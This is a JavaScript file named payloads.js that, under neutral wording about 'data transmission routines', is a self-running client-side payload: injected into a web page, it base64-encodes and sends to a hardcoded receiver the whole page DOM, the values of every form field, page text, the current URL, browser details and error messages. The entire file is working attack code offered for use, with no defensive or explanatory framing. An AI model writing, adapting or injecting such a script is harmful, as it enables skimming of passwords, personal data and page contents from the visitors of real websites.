// payloads.js
// Collection of DOM-aware client-side data transmission routines
// Intended for use in conjunction with a passive decoding receiver

(function () {
  const TARGET = "http://192.168.1.221:8080"; // <-- Update to your receiver

  // Helper: send as base64 via POST
  function postData(encodedPayload, endpoint = "") {
    try {
      const xhr = new XMLHttpRequest();
      xhr.open("POST", `${TARGET}${endpoint}`, true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send("data=" + encodeURIComponent(encodedPayload));
    } catch (e) {
      console.warn("Transmission failed");
    }
  }

  // 1. DOM snapshot
  try {
    const dom = document.documentElement.outerHTML;
    postData(btoa(dom));
  } catch (_) {}

  // 2. Focused inner section
  try {
    const section = document.querySelector("main")?.innerHTML || "";
    postData(btoa(section), "/section");
  } catch (_) {}

  // 3. Local environment details
  try {
    const env = navigator.userAgent + " | " + screen.width + "x" + screen.height + " | " + location.href;
    postData(btoa(env), "/env");
  } catch (_) {}

  // 4. Active form data (shallow)
  try {
    const forms = Array.from(document.forms).map(f => {
      return Array.from(f.elements)
        .map(el => `${el.name}=${el.value}`)
        .join("&");
    });
    postData(btoa(forms.join("\n")), "/forms");
  } catch (_) {}

  // 5. Dynamic script inventory
  try {
    const scripts = Array.from(document.scripts).map(s => s.src || "[inline]").join("\n");
    postData(btoa(scripts), "/scripts");
  } catch (_) {}

  // 6. Simple text content
  try {
    const txt = document.body?.innerText?.slice(0, 1024) || "";
    postData(btoa(txt), "/text");
  } catch (_) {}

  // 7. Frame count + titles
  try {
    const frames = window.frames.length;
    const titles = Array.from(document.querySelectorAll("iframe")).map(f => f.title).join(",");
    postData(btoa(`frames=${frames}, titles=${titles}`), "/frames");
  } catch (_) {}

  // 8. Style and computed color details
  try {
    const sample = document.querySelector("body");
    const color = sample ? getComputedStyle(sample).color : "unknown";
    postData(btoa(`style: ${color}`), "/style");
  } catch (_) {}

  // 9. Script timing fingerprint
  try {
    const start = performance.timing.navigationStart;
    const now = Date.now();
    postData(btoa(`timeDelta=${now - start}`), "/timing");
  } catch (_) {}

  // 10. Passive error signal
  window.addEventListener("error", function (e) {
    postData(btoa("error=" + e.message), "/error");
  });

})();
